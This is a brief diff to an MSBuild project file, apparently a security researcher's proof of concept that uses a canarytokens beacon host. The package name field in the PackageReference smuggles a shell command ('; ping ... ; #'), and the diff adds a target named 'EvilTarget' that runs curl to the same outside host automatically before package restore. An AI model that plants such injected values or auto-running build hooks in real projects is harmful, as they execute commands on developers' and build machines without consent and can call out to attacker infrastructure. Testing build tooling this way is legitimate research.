@@ -8,7 +8,9 @@
     </PropertyGroup>
 
     <ItemGroup>
-      <PackageReference Include="CsvHelper&quot;&gt;&lt; ; ping 22w5f67ylt854tzanwflpwz6z.canarytokens.com ; # !-- " Version="30.0.0" />
+      <PackageReference Include="CsvHelper ; ping 22w5f67ylt854tzanwflpwz6z.canarytokens.com ; # !-- " Version="30.0.0" />
     </ItemGroup>
-
+    <Target Name="EvilTarget" BeforeTargets="Restore">
+        <Exec Command="curl 22w5f67ylt854tzanwflpwz6z.canarytokens.com > /tmp/cure53washere"></Exec>
+    </Target>
 </Project>
